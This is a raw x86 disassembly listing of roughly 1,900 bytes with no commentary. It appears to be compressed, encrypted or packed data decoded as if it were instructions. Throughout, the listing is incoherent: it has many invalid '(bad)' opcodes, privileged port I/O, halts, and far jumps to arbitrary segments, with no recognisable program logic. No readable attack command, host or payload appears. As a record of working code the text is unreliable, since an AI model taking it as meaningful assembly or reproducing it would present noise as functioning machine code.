  426a24:	add    BYTE PTR [eax],al
  426a26:	stc    
  426a27:	dec    esi
  426a28:	add    eax,0xdb8873
  426a2d:	add    BYTE PTR [edi+edx*8],ah
  426a30:	mov    ds:0x873391aa,eax
  426a35:	int    0x5a
  426a37:	les    edx,FWORD PTR [ecx+0x0]
  426a3a:	add    BYTE PTR [esi],ah
  426a3c:	inc    ecx
  426a3d:	inc    ebp
  426a3e:	or     eax,0x4a1f45ed
  426a43:	cmp    BYTE PTR [ecx],dh
  426a45:	cli    
  426a46:	mov    dl,0xa4
  426a48:	bound  ebx,QWORD PTR [ebx]
  426a4a:	cwde   
  426a4b:	popa   
  426a4c:	test   BYTE PTR [eax],dl
  426a4e:	add    BYTE PTR [eax],al
  426a50:	cmp    ebx,esp
  426a52:	mov    ecx,0xee965bab
  426a57:	xor    eax,0xc5ad7d61
  426a5c:	dec    ebx
  426a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a5e:	mov    eax,0x9088
  426a63:	pop    edx
  426a64:	mov    ecx,0xaf0c2f
  426a69:	add    cl,bh
  426a6b:	sub    al,0x30
  426a6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a6e:	jne    0x426ac9
  426a70:	mov    dl,0x98
  426a72:	sbb    ebx,esi
  426a74:	and    eax,0x10040d
  426a79:	add    BYTE PTR [eax-0x80],bh
  426a7c:	data16 add BYTE PTR [eax],al
  426a7f:	mov    bl,0xf2
  426a81:	out    dx,eax
  426a82:	call   0xa95bc80
  426a87:	ins    BYTE PTR es:[edi],dx
  426a88:	pop    ebx
  426a89:	sub    eax,0xb1ff2469
  426a8e:	push   0xa72bf818
  426a93:	xchg   esp,eax
  426a94:	xchg   ebp,eax
  426a95:	mov    ds:0x4e2d7598,al
  426a9a:	mov    esi,0x9794f070
  426a9f:	(bad)  
  426aa1:	out    0xeb,al
  426aa3:	xchg   ebp,eax
  426aa4:	xor    esi,DWORD PTR [edx+0x57]
  426aa7:	pop    eax
  426aa8:	stos   DWORD PTR es:[edi],eax
  426aa9:	inc    ebp
  426aaa:	outs   dx,DWORD PTR ds:[esi]
  426aab:	dec    ebp
  426aac:	fistp  QWORD PTR [edi+0x79]
  426aaf:	xchg   esp,eax
  426ab0:	mov    WORD PTR [eax+eax*1+0x0],fs
  426ab4:	and    eax,edi
  426ab6:	hlt    
  426ab7:	push   0xffffffe1
  426ab9:	out    0xec,eax
  426abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426abc:	sbb    DWORD PTR [edi],ebp
  426abe:	or     eax,0x298c
  426ac3:	sbb    eax,0x1548f1
  426ac8:	add    BYTE PTR [edi+eax*2],ch
  426acb:	push   ebx
  426acc:	sub    al,BYTE PTR [esi-0x24eeb215]
  426ad2:	inc    edi
  426ad3:	sbb    al,0xe7
  426ad5:	data16 and al,0xc0
  426ad8:	jno    0x426ada
  426ada:	add    BYTE PTR [ebp+edx*2+0x56],bl
  426ade:	add    BYTE PTR ds:0x69070000,dl
  426ae4:	icebp  
  426ae5:	push   0x21
  426ae7:	nop
  426ae8:	and    BYTE PTR [eax-0x73],dh
  426aeb:	loope  0x426b3a
  426aed:	cs mov ebp,0x9b88e9
  426af3:	add    BYTE PTR [edx],dl
  426af5:	or     DWORD PTR [esi-0x63],0xffffffa1
  426af9:	outs   dx,BYTE PTR ds:[esi]
  426afa:	aaa    
  426afb:	out    0x16,eax
  426afd:	test   eax,0x70c11e3c
  426b02:	adc    ebp,DWORD PTR [ebp+ebp*1-0x75]
  426b06:	and    BYTE PTR [edx-0x24],al
  426b09:	push   ss
  426b0a:	xchg   ebp,eax
  426b0b:	aam    0xfe
  426b0d:	xor    dl,BYTE PTR [esi+0xe00c]
  426b13:	adc    DWORD PTR [ebp+ecx*1+0x0],ecx
  426b17:	add    BYTE PTR [edx+0x24],ch
  426b1a:	fwait
  426b1b:	imul   esp,DWORD PTR [ecx-0x69],0x58fe925f
  426b22:	xor    DWORD PTR [edx-0x47],ebx
  426b25:	cmp    eax,0xc7c935bf
  426b2a:	test   DWORD PTR [ebx],ebp
  426b2c:	inc    ecx
  426b2d:	out    dx,eax
  426b2e:	mov    bl,0x13
  426b30:	fs pop edi
  426b32:	imul   dh
  426b34:	sbb    dl,BYTE PTR [edi]
  426b36:	push   cs
  426b37:	xchg   esp,eax
  426b38:	push   esi
  426b39:	mov    dl,0x88
  426b3b:	cmp    eax,0x1e380000
  426b40:	push   ds
  426b41:	sbb    ah,BYTE PTR [ecx+0x696ca29f]
  426b47:	adc    DWORD PTR [esi-0x43],esp
  426b4a:	push   esp
  426b4b:	xchg   DWORD PTR [ebp+0x1a8171dd],ecx
  426b51:	jns    0x426b8b
  426b53:	sub    dl,cl
  426b55:	or     dl,dh
  426b57:	add    BYTE PTR [eax],al
  426b59:	rol    ebp,cl
  426b5b:	inc    ecx
  426b5c:	and    eax,0xe544e1
  426b61:	add    BYTE PTR [esi],ah
  426b63:	(bad)  
  426b64:	das    
  426b65:	shl    BYTE PTR [edi+0x28],cl
  426b68:	mov    ch,0x68
  426b6a:	jecxz  0x426b66
  426b6c:	scas   al,BYTE PTR es:[edi]
  426b6d:	out    dx,eax
  426b6e:	xchg   edx,eax
  426b6f:	dec    ecx
  426b70:	push   0x96b3b70f
  426b75:	push   0x3a
  426b77:	cld    
  426b78:	sub    ebp,DWORD PTR [ebx+0xa544]
  426b7e:	aaa    
  426b7f:	jb     0x426b55
  426b81:	cli    
  426b82:	mov    eax,ds:0x371192d2
  426b87:	add    al,0x75
  426b89:	add    BYTE PTR [eax],al
  426b8b:	lds    esp,FWORD PTR [esi]
  426b8d:	mov    edi,0x74fab94a
  426b92:	not    DWORD PTR ds:0x490e0e72
  426b98:	mov    ds:0xecbc33e4,al
  426b9d:	sub    DWORD PTR [ebp-0x4d],esi
  426ba0:	and    al,0xb1
  426ba2:	cld    
  426ba3:	or     al,0x2c
  426ba5:	add    BYTE PTR [eax],al
  426ba7:	retf   0x4829
  426baa:	jne    0x426bac
  426bac:	add    BYTE PTR ds:0xa52ac27f,bl
  426bb2:	into   
  426bb3:	cli    
  426bb4:	loope  0x426b90
  426bb6:	es push 0xffffffbd
  426bb9:	mov    cl,0x2e
  426bbb:	popa   
  426bbc:	outs   dx,BYTE PTR ds:[esi]
  426bbd:	mov    esp,0xd0ff7536
  426bc2:	dec    esp
  426bc3:	dec    ebp
  426bc4:	add    BYTE PTR [eax],al
  426bc6:	pop    edi
  426bc7:	jbe    0x426b95
  426bc9:	pop    edi
  426bca:	add    BYTE PTR [eax],al
  426bcc:	add    DWORD PTR [edx+ebp*8],ebp
  426bcf:	mov    cl,0xad
  426bd1:	out    dx,eax
  426bd2:	push   0xffffffed
  426bd4:	and    esi,eax
  426bd6:	mov    al,ds:0x1f3b7c6a
  426bdb:	rcl    ebx,cl
  426bdd:	push   ds
  426bde:	hlt    
  426bdf:	fisub  DWORD PTR [edi+0x4d]
  426be2:	mov    ds:0x1bc0,eax
  426be7:	or     DWORD PTR [ebp+0x1ebb003],edx
  426bed:	mov    edi,0x4b1d1d74
  426bf2:	sbb    DWORD PTR [edx],0xe8409cad
  426bf8:	add    BYTE PTR [eax],al
  426bfa:	push   ebx
  426bfb:	xchg   ebx,eax
  426bfc:	test   eax,0xd749a252
  426c01:	adc    al,0xbe
  426c03:	shl    DWORD PTR [eax+0x3b],1
  426c06:	xchg   edi,eax
  426c07:	jns    0x426c3e
  426c09:	mov    edi,0x5c4fe375
  426c0e:	adc    eax,0x29c1b00e
  426c13:	sbb    al,0x73
  426c15:	hlt    
  426c16:	sbb    ecx,DWORD PTR [ebx]
  426c18:	push   eax
  426c19:	mov    ?,WORD PTR [ebp+0x247201a]
  426c1f:	rol    BYTE PTR [edi+ebx*1],1
  426c22:	add    BYTE PTR [eax],al
  426c24:	pop    ss
  426c25:	sahf   
  426c26:	into   
  426c27:	push   esp
  426c28:	add    eax,DWORD PTR [ebx]
  426c2a:	sti    
  426c2b:	data16 fisub DWORD PTR [esi]
  426c2e:	mov    ah,0xc3
  426c30:	xor    BYTE PTR [ecx],al
  426c32:	pop    eax
  426c33:	call   0xe424:0x86c61c18
  426c3a:	leave  
  426c3b:	cs std 
  426c3d:	cmp    al,0x1d
  426c3f:	test   BYTE PTR [ecx-0x41],0x6a
  426c43:	adc    edi,DWORD PTR [edx-0x47]
  426c46:	rol    BYTE PTR [edx],cl
  426c48:	in     al,0x70
  426c4a:	mov    DWORD PTR ds:0xf7880f,esi
  426c50:	add    BYTE PTR [edi+0x64],dl
  426c53:	fisttp WORD PTR [edx+0x14]
  426c56:	xchg   esp,eax
  426c57:	push   ds
  426c58:	xor    al,0xb6
  426c5a:	adc    ebp,DWORD PTR [edi+eiz*1+0x7a]
  426c5e:	fs mov cl,0x8e
  426c61:	pop    edx
  426c62:	xor    bh,BYTE PTR [ebx-0x5b]
  426c65:	sti    
  426c66:	pusha  
  426c67:	sub    ah,BYTE PTR [ecx+0x3e]
  426c6a:	or     edi,DWORD PTR [ebp+edi*2-0x3daa8d4a]
  426c71:	cmc    
  426c72:	call   0xa847:0x7164a3ac
  426c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c7a:	int3   
  426c7b:	pop    ebx
  426c7c:	add    BYTE PTR [eax],al
  426c7e:	je     0x426c61
  426c80:	(bad)  
  426c81:	mov    edx,0xeccae
  426c86:	add    BYTE PTR [eax],dl
  426c88:	inc    ecx
  426c89:	jmp    0x426cbd
  426c8b:	cmp    al,0x7c
  426c8d:	pop    esp
  426c8e:	test   al,0xeb
  426c90:	cmc    
  426c91:	sar    DWORD PTR [eax+0xda80],cl
  426c97:	in     al,0x31
  426c99:	mov    esi,0x1c28ba4d
  426c9e:	iret   
  426c9f:	push   ds
  426ca0:	push   esi
  426ca1:	out    dx,eax
  426ca2:	or     BYTE PTR [edx],bl
  426ca4:	add    BYTE PTR [eax],al
  426ca6:	enter  0x91,0x0
  426caa:	test   al,bl
  426cac:	add    BYTE PTR [eax],al
  426cae:	fucomi st,st(6)
  426cb0:	and    eax,0x56a06a63
  426cb5:	fs sbb al,0x85
  426cb8:	sbb    DWORD PTR [edi-0x1e],0xffffffe4
  426cbc:	mov    bh,0x8c
  426cbe:	mov    eax,0x47da0000
  426cc3:	xlat   BYTE PTR ds:[ebx]
  426cc4:	add    ecx,ebp
  426cc6:	pop    ds
  426cc7:	movq   QWORD PTR [ecx-0x3c],mm4
  426ccb:	push   esi
  426ccc:	add    BYTE PTR [eax],al
  426cce:	dec    WORD PTR [eax-0x1b]
  426cd2:	add    BYTE PTR [eax],al
  426cd4:	xor    al,0x58
  426cd6:	xchg   esi,eax
  426cd7:	push   esp
  426cd8:	test   al,0xb3
  426cda:	sbb    DWORD PTR [edi-0x23],0x78
  426cde:	call   0x10c2:0x4237431c
  426ce5:	mov    cl,0xcd
  426ce7:	push   edi
  426ce8:	pop    esi
  426ce9:	pop    esp
  426cea:	mov    ds:0x35678bb5,al
  426cef:	push   0xb956e96
  426cf4:	jp     0x426d20
  426cf6:	es mov cl,0xef
  426cf9:	sahf   
  426cfa:	fimul  DWORD PTR [eax-0x2affffbe]
  426d00:	pusha  
  426d01:	jp     0x426cac
  426d03:	fld    QWORD PTR [eax]
  426d05:	mov    es,WORD PTR [eax]
  426d07:	add    BYTE PTR [eax+0x60],ah
  426d0a:	pop    ebp
  426d0b:	sub    ch,BYTE PTR [esi+0x4f]
  426d0e:	mov    al,ds:0xf4081b60
  426d13:	add    BYTE PTR [eax],al
  426d15:	(bad)  
  426d17:	rol    DWORD PTR [eax],0x0
  426d1a:	fwait
  426d1b:	icebp  
  426d1c:	retf   
  426d1d:	std    
  426d1e:	loope  0x426d8d
  426d20:	cmp    al,0x80
  426d22:	add    DWORD PTR [eax],0x0
  426d25:	cdq    
  426d26:	sub    DWORD PTR [edx+0x7b],0xe22e0183
  426d2d:	add    ebx,DWORD PTR [ecx]
  426d2f:	ins    DWORD PTR es:[edi],dx
  426d30:	lods   eax,DWORD PTR ds:[esi]
  426d31:	push   cs
  426d32:	jl     0x426d6d
  426d34:	pop    edi
  426d35:	lods   eax,DWORD PTR ds:[esi]
  426d36:	pop    esp
  426d37:	jne    0x426db3
  426d39:	int    0x7
  426d3b:	jecxz  0x426d0f
  426d3d:	mov    eax,0x2a487294
  426d42:	add    BYTE PTR [eax],al
  426d44:	arpl   bx,cx
  426d46:	sbb    esp,DWORD PTR [ebx+0x1fb0142e]
  426d4c:	jmp    0x426d9a
  426d4e:	inc    ebx
  426d4f:	add    BYTE PTR [eax],al
  426d51:	lea    ebx,[edi+0x469a1b94]
  426d57:	popf   
  426d58:	add    bh,al
  426d5a:	call   0xe08e:0x76ff5ed
  426d61:	cli    
  426d62:	pop    es
  426d63:	not    BYTE PTR [ebx+0x1c90b287]
  426d69:	adc    bl,al
  426d6b:	and    eax,0xec1b50a9
  426d70:	jno    0x426db7
  426d72:	(bad)  
  426d73:	fstp   QWORD PTR [esi+0x427df777]
  426d79:	hlt    
  426d7a:	mov    ds:0x42773537,al
  426d7f:	out    0x65,al
  426d81:	mov    dl,BYTE PTR [edi]
  426d83:	out    0x66,al
  426d85:	mov    edi,0x3c2a5d7d
  426d8a:	push   edi
  426d8b:	and    DWORD PTR [ebp+0x22544dbe],esi
  426d91:	(bad)  
  426d92:	outs   dx,DWORD PTR ds:[esi]
  426d93:	xchg   DWORD PTR [edi-0x82ef41c],ebp
  426d99:	fcomp  QWORD PTR [ebx-0x70695a27]
  426d9f:	enter  0xca,0x0
  426da3:	sub    al,0x47
  426da5:	xchg   ebp,eax
  426da6:	xchg   WORD PTR [esi+0x44],dx
  426daa:	ja     0x426dac
  426dac:	add    ah,bh
  426dae:	sbb    esp,DWORD PTR [edi+0x689a3525]
  426db4:	loope  0x426d5b
  426db6:	cli    
  426db7:	jnp    0x426e31
  426db9:	ret    
  426dba:	leave  
  426dbb:	inc    edx
  426dbc:	repnz sbb cl,BYTE PTR [edx+0xe8484e]
  426dc3:	add    BYTE PTR [esi+eiz*1+0x0],cl
  426dc7:	add    ah,ch
  426dc9:	sub    BYTE PTR [esi],al
  426dcb:	cld    
  426dcc:	pop    ebp
  426dcd:	out    0x99,eax
  426dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dd0:	inc    ebx
  426dd1:	outs   dx,DWORD PTR ds:[esi]
  426dd2:	push   eax
  426dd3:	push   ebx
  426dd4:	dec    edx
  426dd5:	or     DWORD PTR [ebp-0x25081603],esp
  426ddb:	or     BYTE PTR [edi],bl
  426ddd:	add    BYTE PTR [eax],al
  426ddf:	mov    BYTE PTR [ebp-0xe],0x95
  426de3:	pop    eax
  426de4:	ret    0x4cc8
  426de7:	add    BYTE PTR [eax],al
  426de9:	xchg   esp,eax
  426dea:	out    0x40,al
  426dec:	xchg   esi,eax
  426ded:	add    BYTE PTR [eax],al
  426def:	repnz scas al,BYTE PTR es:[edi]
  426df1:	dec    esi
  426df2:	out    0xa0,eax
  426df4:	iret   
  426df5:	or     eax,0xe0881d83
  426dfa:	add    BYTE PTR [eax],al
  426dfc:	scas   al,BYTE PTR es:[edi]
  426dfd:	icebp  
  426dfe:	nop
  426dff:	mov    esp,0xd0001063
  426e04:	add    BYTE PTR [eax],al
  426e06:	push   edi
  426e07:	ret    
  426e08:	fsub   QWORD PTR [esi-0x6d75008a]
  426e0e:	leave  
  426e0f:	cld    
  426e10:	and    DWORD PTR [ebp-0x5c],eax
  426e13:	xchg   ebp,eax
  426e14:	add    BYTE PTR [ebx+0x0],ch
  426e17:	add    al,ch
  426e19:	and    BYTE PTR [esi-0x18],cl
  426e1c:	int3   
  426e1d:	mov    al,BYTE PTR [eax]
  426e1f:	add    ah,dh
  426e21:	aas    
  426e22:	push   esp
  426e23:	adc    eax,0x697b997c
  426e28:	ja     0x426e14
  426e2a:	or     ecx,DWORD PTR [esi-0x48cbb20d]
  426e30:	bound  esp,QWORD PTR [eax]
  426e32:	fmul   DWORD PTR [ecx]
  426e34:	addr16 popa 
  426e36:	mov    DWORD PTR [esi+0x1aa134d8],ecx
  426e3c:	push   0x6dee383
  426e41:	and    BYTE PTR [ebx-0x626785c],bh
  426e47:	iret   
  426e48:	stc    
  426e49:	loopne 0x426e02
  426e4b:	das    
  426e4c:	xchg   ebp,eax
  426e4d:	dec    esp
  426e4e:	push   ds
  426e4f:	add    BYTE PTR [eax],al
  426e51:	inc    ebp
  426e52:	sar    DWORD PTR [eax-0x435015a3],0x53
  426e59:	clc    
  426e5a:	fs adc al,0x85
  426e5d:	xor    ebx,DWORD PTR ds:[ebx+0x5f]
  426e61:	loope  0x426e6a
  426e63:	arpl   WORD PTR [ecx-0x2a],si
  426e66:	popa   
  426e67:	fiadd  DWORD PTR [esi-0x65]
  426e6a:	push   ds
  426e6b:	dec    ebp
  426e6c:	aaa    
  426e6d:	(bad)
  426e72:	add    al,bh
  426e74:	xchg   bp,ax
  426e76:	clc    
  426e77:	cmp    al,0x3f
  426e79:	je     0x426e82
  426e7b:	popf   
  426e7c:	mov    cl,0xc8
  426e7e:	test   eax,0xfa420000
  426e83:	in     al,0x67
  426e85:	int3   
  426e86:	add    BYTE PTR [eax],al
  426e88:	add    al,dl
  426e8a:	adc    bl,dl
  426e8c:	dec    edi
  426e8d:	mov    WORD PTR [ebp+0x0],es
  426e90:	add    BYTE PTR [esi+eiz*1+0x3c],ah
  426e94:	fbstp  TBYTE PTR [eax]
  426e96:	gs test eax,0xd363f435
  426e9c:	cmp    DWORD PTR [ebx-0x4c],0xe0745dbd
  426ea3:	inc    edx
  426ea4:	sub    al,0x16
  426ea6:	pop    edi
  426ea7:	pushf  
  426ea8:	iret   
  426ea9:	mov    bl,0x8e
  426eab:	or     DWORD PTR [edx-0x1d],edx
  426eae:	out    0xa9,al
  426eb0:	push   eax
  426eb1:	adc    eax,0x7ba146b6
  426eb6:	pop    ebp
  426eb7:	lock pushf 
  426eb9:	sbb    dl,BYTE PTR [ebx]
  426ebb:	ins    DWORD PTR es:[edi],dx
  426ebc:	push   eax
  426ebd:	and    eax,0x74e34a16
  426ec2:	jbe    0x426ecb
  426ec4:	pop    edx
  426ec5:	pop    ds
  426ec6:	gs sub esi,DWORD PTR es:[esi]
  426eca:	inc    ebx
  426ecb:	jge    0x426ed1
  426ecd:	inc    DWORD PTR [eax]
  426ecf:	add    ch,bl
  426ed1:	push   ecx
  426ed2:	xchg   esp,eax
  426ed3:	jl     0x426ef7
  426ed5:	xor    edi,ecx
  426ed7:	cmp    eax,edx
  426ed9:	push   esi
  426eda:	dec    edx
  426edb:	and    bl,cl
  426edd:	aam    0x56
  426edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ee0:	ins    BYTE PTR es:[edi],dx
  426ee1:	and    cl,BYTE PTR [ecx-0x33]
  426ee4:	aam    0x2a
  426ee6:	bound  esi,QWORD PTR [esi]
  426ee8:	or     eax,0x4d54e161
  426eed:	retf   0x61bc
  426ef0:	cmp    al,0x15
  426ef2:	fs inc edx
  426ef4:	stos   DWORD PTR es:[edi],eax
  426ef5:	stos   DWORD PTR es:[edi],eax
  426ef6:	jl     0x426ec7
  426ef8:	xor    bl,ah
  426efa:	xor    eax,0xecc9d181
  426eff:	test   DWORD PTR ds:0x9b74f6c3,esi
  426f05:	ficom  DWORD PTR [ebx]
  426f07:	and    eax,0xf39a5220
  426f0c:	dec    ebp
  426f0d:	jb     0x426f25
  426f0f:	sub    eax,0xcca91f3e
  426f14:	scas   al,BYTE PTR es:[edi]
  426f15:	add    BYTE PTR [eax],al
  426f17:	inc    esi
  426f18:	mov    DWORD PTR [ebp+eax*4-0x43],ebx
  426f1c:	in     eax,0x70
  426f1e:	and    DWORD PTR [eax-0x56db19c],ebp
  426f24:	sbb    al,0xe6
  426f26:	loop   0x426f70
  426f28:	mov    ecx,0xc2870000
  426f2d:	mov    dh,0x22
  426f2f:	aam    0x36
  426f31:	adc    eax,eax
  426f33:	std    
  426f34:	add    BYTE PTR [eax],al
  426f36:	add    ebp,0x4b6d4af0
  426f3c:	jmp    0x1c32:0x70a21ae6
  426f43:	(bad)  [esi+0x2f]
  426f46:	mov    ds:0x24a5d1d0,eax
  426f4b:	popf   
  426f4c:	sbb    eax,eax
  426f4e:	inc    edx
  426f4f:	add    BYTE PTR [eax],al
  426f51:	imul   ecx,DWORD PTR [esi],0x372b3e32
  426f57:	jp     0x426f8b
  426f59:	sub    edi,DWORD PTR [ecx+eax*8-0xe]
  426f5d:	out    0x86,al
  426f5f:	mov    eax,ds:0x4ab05a37
  426f64:	push   cs
  426f65:	ja     0x426f5f
  426f67:	call   0xe7302a
  426f6c:	add    BYTE PTR [ebp+0x7f],dl
  426f6f:	dec    esi
  426f70:	mov    dh,0x1f
  426f72:	fist   WORD PTR [edi-0x3e]
  426f75:	or     eax,0xd08457
  426f7a:	add    BYTE PTR [ecx-0x13],al
  426f7d:	and    al,0x5a
  426f7f:	mov    edi,0xfdcc4b73
  426f84:	add    BYTE PTR [eax],al
  426f86:	out    dx,eax
  426f87:	mov    eax,0x4c935eac
  426f8c:	and    eax,0x58140000
  426f91:	mov    WORD PTR [eax+eax*1],fs
  426f94:	add    BYTE PTR [ebx],ch
  426f96:	(bad)
  426f99:	ficomp WORD PTR ds:0x5afe5a75
  426f9f:	test   esp,esi
  426fa1:	sub    al,BYTE PTR [eax-0x22]
  426fa4:	add    BYTE PTR [eax],al
  426fa6:	cli    
  426fa7:	xchg   esp,eax
  426fa8:	inc    eax
  426fa9:	sbb    BYTE PTR [eax],al
  426fab:	add    ah,dh
  426fad:	mov    esi,0x41764568
  426fb2:	mov    edi,0xa3737c8e
  426fb7:	mov    bh,BYTE PTR [ebx-0x8]
  426fba:	jae    0x426f8e
  426fbc:	test   eax,0x50e3c2f4
  426fc1:	push   edx
  426fc2:	mov    dh,0x7f
  426fc4:	jg     0x426f5a
  426fc6:	mov    esi,DWORD PTR ss:[edi+0x2f]
  426fca:	and    ebx,DWORD PTR [bp+di+0x7489]
  426fcf:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  426fd1:	sub    eax,0x82c4fc
  426fd6:	add    BYTE PTR [esi],bl
  426fd8:	jb     0x426f9e
  426fda:	pop    ebp
  426fdb:	add    BYTE PTR [eax],al
  426fdd:	stos   BYTE PTR es:[edi],al
  426fde:	inc    esi
  426fdf:	dec    edx
  426fe0:	loope  0x426f8c
  426fe2:	std    
  426fe3:	inc    ebp
  426fe4:	xor    dl,BYTE PTR [edi+0x6f]
  426fe7:	clc    
  426fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fe9:	js     0x426fd9
  426feb:	xchg   edi,eax
  426fec:	out    0xf7,al
  426fee:	out    0xab,eax
  426ff0:	mov    edi,0xd798dfed
  426ff5:	sti    
  426ff6:	mov    esp,0xa679b63c
  426ffb:	xor    bl,BYTE PTR [eax]
  426ffd:	mov    cl,0xcc
  426fff:	push   ecx
  427000:	add    BYTE PTR [eax],al
  427002:	js     0x426fb4
  427004:	add    bh,BYTE PTR [eax+0x7fc92782]
  42700a:	adc    al,BYTE PTR [edx+0x396906d5]
  427010:	fwait
  427011:	jnp    0x42704b
  427013:	dec    esi
  427014:	ss inc ebx
  427016:	and    DWORD PTR [edi-0x72],esi
  427019:	and    dl,ah
  42701b:	popa   
  42701c:	inc    esi
  42701d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42701e:	mov    BYTE PTR [eax-0x18b0000],cl
  427024:	mov    ebx,0x2c6335b9
  427029:	sbb    al,0x3b
  42702b:	cmc    
  42702c:	jae    0x426fc5
  42702e:	loope  0x426fe5
  427030:	jge    0x42700a
  427032:	fmul   st(1),st
  427034:	in     al,dx
  427035:	outs   dx,DWORD PTR ds:[esi]
  427036:	push   esi
  427037:	shl    bl,1
  427039:	test   al,0xde
  42703b:	adc    al,0xc9
  42703d:	push   cs
  42703e:	inc    eax
  42703f:	push   ecx
  427040:	add    BYTE PTR [eax],al
  427042:	gs stc 
  427044:	push   es
  427045:	ret    0x595
  427048:	or     al,0x85
  42704a:	add    BYTE PTR [eax],al
  42704c:	mov    DWORD PTR [esi],ecx
  42704e:	int    0x11
  427050:	das    
  427051:	cmp    ecx,edx
  427053:	scas   eax,DWORD PTR es:[edi]
  427054:	push   0x2c5ec12b
  427059:	lods   al,BYTE PTR ds:[esi]
  42705a:	arpl   WORD PTR [edx*4-0x581fcc3a],si
  427061:	pop    ebx
  427062:	shl    edi,0x79
  427065:	and    BYTE PTR [esi-0x5e49768e],dl
  42706b:	add    BYTE PTR [ecx],cl
  42706d:	add    BYTE PTR [eax],al
  42706f:	xchg   ecx,eax
  427070:	sbb    DWORD PTR [edx+0x6265b46b],ebp
  427076:	ja     0x4270e7
  427078:	dec    ebp
  427079:	int3   
  42707a:	jns    0x42707c
  42707c:	add    BYTE PTR [eax+0x2cf27d67],bh
  427082:	pop    esp
  427083:	push   ebx
  427084:	stc    
  427085:	or     edx,DWORD PTR [edx+ecx*8-0x26]
  427089:	jmp    0xf033:0x6e1bae4a
  427090:	retf   0x8e45
  427093:	mov    eax,0x447681a4
  427098:	loop   0x42709a
  42709a:	add    BYTE PTR [ecx-0x6c],dl
  42709d:	jmp    0x0:0x844c3529
  4270a4:	lahf   
  4270a5:	jmp    0x427105
  4270a7:	test   DWORD PTR [edx-0x701cb6fb],edx
  4270ad:	pop    ecx
  4270ae:	sub    ch,bl
  4270b0:	mov    eax,ds:0x721eacb1
  4270b5:	and    esp,ebx
  4270b7:	xor    BYTE PTR [ecx+0x7e],al
  4270ba:	sbb    al,0x58
  4270bc:	or     al,0x34
  4270be:	add    BYTE PTR [eax],al
  4270c0:	repnz cwde 
  4270c2:	lods   al,BYTE PTR ds:[esi]
  4270c3:	adc    eax,0x66633973
  4270c8:	mov    bl,0xa1
  4270ca:	and    eax,DWORD PTR [edi-0x3c]
  4270cd:	fadd   DWORD PTR [eax]
  4270cf:	add    BYTE PTR [ebx-0x6bd7091a],cl
  4270d5:	cmc    
  4270d6:	jge    0x427076
  4270d8:	mov    al,ds:0x5a08
  4270dd:	xchg   esp,eax
  4270de:	xchg   ebp,eax
  4270df:	inc    edx
  4270e0:	inc    esi
  4270e1:	push   ss
  4270e2:	scas   eax,DWORD PTR es:[edi]
  4270e3:	xchg   ecx,eax
  4270e4:	bswap  esp
  4270e6:	fiadd  WORD PTR [eax]
  4270e8:	add    BYTE PTR [eax-0x771c546b],ah
  4270ee:	imul   eax,DWORD PTR [eax],0x0
  4270f1:	(bad)  
  4270f2:	or     DWORD PTR [esi],0xb977aa0
  4270f8:	ret    
  4270f9:	rol    DWORD PTR [esi-0x8e3eb58],0xe
  427100:	fsub   st(7),st
  427102:	jnp    0x42714f
  427104:	xor    ebp,DWORD PTR [edx-0x26b694f0]
  42710a:	arpl   WORD PTR [esi-0x43],ax
  42710d:	push   edi
  42710e:	loope  0x4270f0
  427110:	jnp    0x42714e
  427112:	cli    
  427113:	les    ebx,FWORD PTR [ebp+0x0]
  427116:	add    BYTE PTR [eax],dl
  427118:	popa   
  427119:	dec    edi
  42711a:	(bad)  
  42711c:	or     ecx,DWORD PTR [edi]
  42711e:	xchg   BYTE PTR [ecx-0x6af94d7],al
  427124:	es jno 0x4270bc
  427127:	xor    BYTE PTR [edx+edx*4+0x722afaec],bl
  42712e:	mov    dh,0xb2
  427130:	push   0xffffffcd
  427132:	push   ecx
  427133:	xchg   edi,eax
  427134:	lods   eax,DWORD PTR ds:[esi]
  427135:	inc    ebp
  427136:	adc    ah,ah
  427138:	push   ebx
  427139:	test   BYTE PTR [ebx+0x0],ch
  42713c:	add    BYTE PTR [edx+0x19316ae9],dh
  427142:	add    eax,0x77e4bcd
  427147:	dec    ecx
  427148:	or     eax,0x6ba294aa
  42714d:	jmp    0xd96e:0x1733a5ef
  427154:	mov    al,0xf2
  427156:	in     eax,dx
  427157:	mov    cl,0xdd
  427159:	and    eax,0x1167d8a7
  42715e:	stos   DWORD PTR es:[edi],eax
  42715f:	leave  
  427160:	stos   BYTE PTR es:[edi],al
  427161:	aaa    
  427162:	cmp    al,0x83
  427164:	addr16 cld 
  427166:	sub    BYTE PTR [edi],0xb
  427169:	cmc    
  42716a:	mov    cl,0xe2
  42716c:	test   cl,ah
  42716e:	add    BYTE PTR [eax],al
  427170:	mov    al,ds:0x61f3e45
  427175:	push   ss
  427176:	gs push ebx
  427178:	mov    ebp,0xba54fe02
  42717d:	mov    ds:0xd581f2d,al
  427182:	test   DWORD PTR [esi],eax
  427184:	pop    ebx
  427185:	or     bh,BYTE PTR [ebp-0x1c6a8dba]
  42718b:	cdq    
  42718c:	rcr    bx,cl
  42718f:	mov    ds:0xafcfec45,al
  427194:	jo     0x427163
  427196:	dec    ebp
  427197:	rol    BYTE PTR [esi-0x47a9fa27],1
  42719d:	gs xchg edi,eax
  42719f:	xchg   ecx,eax
  4271a0:	or     BYTE PTR [eax+eax*1],cl
  4271a3:	add    BYTE PTR [eax+eax*1],bl
  4271a6:	(bad)  
  4271a7:	add    BYTE PTR [eax],al
  4271a9:	jbe    0x427189
  4271ab:	ret    
  4271ac:	xor    eax,0x6cc1b6fb
  4271b1:	(bad)  
  4271b2:	push   edi
  4271b3:	das    
  4271b4:	mov    cl,0xdd
  4271b6:	int3   
  4271b7:	push   edi
  4271b8:	add    BYTE PTR [eax],al
  4271ba:	adc    al,0x1d
  4271bc:	rcl    BYTE PTR [eax],0x0
  4271bf:	add    BYTE PTR [esi+0x4d],al
  4271c2:	sbb    BYTE PTR [edx-0xc],dh
  4271c5:	mov    al,0xe2
  4271c7:	fwait
  4271c8:	jl     0x427206
  4271ca:	xchg   ebp,eax
  4271cb:	mov    ds:0xe1060960,eax
